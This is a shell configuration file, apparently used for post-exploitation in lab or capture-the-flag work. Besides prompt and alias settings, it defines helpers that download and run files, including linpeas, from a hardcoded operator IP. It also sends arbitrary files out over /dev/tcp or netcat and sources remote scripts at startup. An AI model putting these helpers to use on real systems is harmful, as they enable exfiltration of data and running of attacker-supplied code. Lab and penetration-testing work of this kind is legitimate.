# vim:filetype=sh

#---------------------------------------------------------------------------------------------------
#                                             ALIASES
#---------------------------------------------------------------------------------------------------
alias la='ls -alh --color=always'
alias grep='grep --color=auto'
alias pgrep='pgrep -iaf'
alias wget='wget -c --show-progress'


#---------------------------------------------------------------------------------------------------
#                                             FUNCTIONS
#---------------------------------------------------------------------------------------------------
_HTTP_SERVER_PORT=80
_FILE_TRANSFER_PORT=9898

get() {
  cd /tmp || return

  command -v wget >/dev/null 2>&1              \
    && wget -c --show-progress "http://$IP/$1" \
    && return

  command -v curl >/dev/null 2>&1 \
    && curl -O "http://$IP/$1"    \
    && return

  command -v nc >/dev/null 2>&1                                                      \
    && printf "GET /%s HTTP/1.1\n\n" "$1" | nc -nv "$IP" "$_HTTP_SERVER_PORT" > "$1" \
    && sed -i '1,7d' "$1"                                                            \
    && return
}

send() {
  # shellcheck disable=SC3025
  [ "$SHELL" = "/bin/bash" ]                            \
    && cat "$1" > /dev/tcp/"$IP"/"$_FILE_TRANSFER_PORT" \
    && return

  command -v nc >/dev/null 2>&1                   \
    && nc -nv "$IP" "$_FILE_TRANSFER_PORT" < "$1" \
    && return
}

lp() {
  _user="$(id | grep -Eo '\(([^)]+)\)' | head -1)"
  _user="${_user#?}"
  _user="${_user%?}"

  get linpeas           \
    && chmod +x linpeas \
    && ./linpeas | tee -a "$_user.linpeas"
}

# prompt
_set_vi_mode_prompt_strings () {
  ### NORMAL MODE
  # [ - symbol
  NORMAL_MODE_PROMPT="\[\e[33m\][\[\e[m\]"
  # \u - user
  NORMAL_MODE_PROMPT+="\[\e[0;1;38;5;141m\]\u\[\e[0m\]"
  # @ - symbol
  NORMAL_MODE_PROMPT+="\[\e[33m\]@\[\e[m\]"
  # \h - hostname short
  NORMAL_MODE_PROMPT+="\[\e[0;38;5;209m\]\h\[\e[0m\]"
  # : - symbol
  NORMAL_MODE_PROMPT+="\[\e[33m\]:\[\e[m\]"
  # __prompt_string_compact_pwd - function
  NORMAL_MODE_PROMPT+="\[\e[32m\]\$(__prompt_string_compact_pwd)\[\e[m\]"
  # ] - symbol
  NORMAL_MODE_PROMPT+="\[\e[33m\]]\[\e[m\]"
  # ' 'N - space + symbol (vi mode indicator)
  NORMAL_MODE_PROMPT+=" \[\e[32m\]N\[\e[m\]"
  # ' ': - space + symbol
  NORMAL_MODE_PROMPT+=" \[\e[32m\]:\[\e[m\]"
  # : - symbol
  NORMAL_MODE_PROMPT+="\[\e[32m\]:\[\e[m\]"
  # : - symbol
  NORMAL_MODE_PROMPT+="\[\e[32m\]:\[\e[m\]"
  bind "set vi-cmd-mode-string \"${NORMAL_MODE_PROMPT@P}\""

  ### INSERT MODE
  # [ - symbol
  INSERT_MODE_PROMPT="\[\e[33m\][\[\e[m\]"
  # \u - user
  INSERT_MODE_PROMPT+="\[\e[0;1;38;5;141m\]\u\[\e[0m\]"
  # @ - symbol
  INSERT_MODE_PROMPT+="\[\e[33m\]@\[\e[m\]"
  # \h - hostname short
  INSERT_MODE_PROMPT+="\[\e[0;38;5;209m\]\h\[\e[0m\]"
  # : - symbol
  INSERT_MODE_PROMPT+="\[\e[33m\]:\[\e[m\]"
  # __prompt_string_compact_pwd - function
  INSERT_MODE_PROMPT+="\[\e[32m\]\$(__prompt_string_compact_pwd)\[\e[m\]"
  # ] - symbol
  INSERT_MODE_PROMPT+="\[\e[33m\]]\[\e[m\]"
  # ' 'I - space + symbol (vi mode indicator)
  INSERT_MODE_PROMPT+=" \[\e[34m\]I\[\e[m\]"
  # ' '> - space + symbol
  INSERT_MODE_PROMPT+=" \[\e[34m\]>\[\e[m\]"
  # > - symbol
  INSERT_MODE_PROMPT+="\[\e[34m\]>\[\e[m\]"
  # > - symbol
  INSERT_MODE_PROMPT+="\[\e[34m\]>\[\e[m\]"
  bind "set vi-ins-mode-string \"${INSERT_MODE_PROMPT@P}\""
}

# Compact current working directory
__prompt_string_compact_pwd(){
  w='\w'; IFS=/ read -ra a <<< "${w@P}"
  ((c=${#a[@]}-1))
  for e in "${a[@]::$c}"; do
    [[ $e =~ ^\. ]]&&l=2||l=1
    printf '%s/' "${e:0:$l}"
  done;
  echo "${a[$c]}"
}


#---------------------------------------------------------------------------------------------------
#                                         ENV and SETTINGS
#---------------------------------------------------------------------------------------------------
export PATH="${PATH}:/tmp"
export TERM=screen-256color
export IP="10.10.14.164"
export LESSHISTFILE="/dev/null"
export LESS="-igRF -j.5 --mouse --wheel-lines=2"

# Set up bash if available
if command -v bash >/dev/null 2>&1; then
  export SHELL=/bin/bash

  # If set, the pattern "**" used in a pathname expansion context will
  # match all files and zero or more directories and subdirectories.
  shopt -s globstar

  # Prepend cd when entering just a path in the shell
  shopt -s autocd

  # Allow to cd in dir which value is held in variable
  shopt -s cdable_vars

  # Show commands run on multiple lines on one in history
  shopt -s cmdhist

  # Avoid completion on an empty line
  shopt -s no_empty_cmd_completion

  # prompt
  PROMPT_COMMAND=''
  PROMPT_COMMAND+='_set_vi_mode_prompt_strings'
  # These are appended to PROMPT_COMMAND and need at least one char
  PS1=' '
  PS2=' ↳ '

  # vi mode + bindings
  get inputrc          \
    && bind -f inputrc \
    && rm inputrc

  # bash completion
  get bash_completion         \
    && source bash_completion \
    && rm bash_completion
else
  export SHELL=/bin/sh
fi

if command -v vim >/dev/null 2>&1; then
  export EDITOR="vim"
  export VISUAL="vim"
else
  export EDITOR="vi"
  export VISUAL="vi"
fi


#---------------------------------------------------------------------------------------------------
#                                            COMMANDS
#---------------------------------------------------------------------------------------------------
# fix terminal
stty rows 63 cols 119
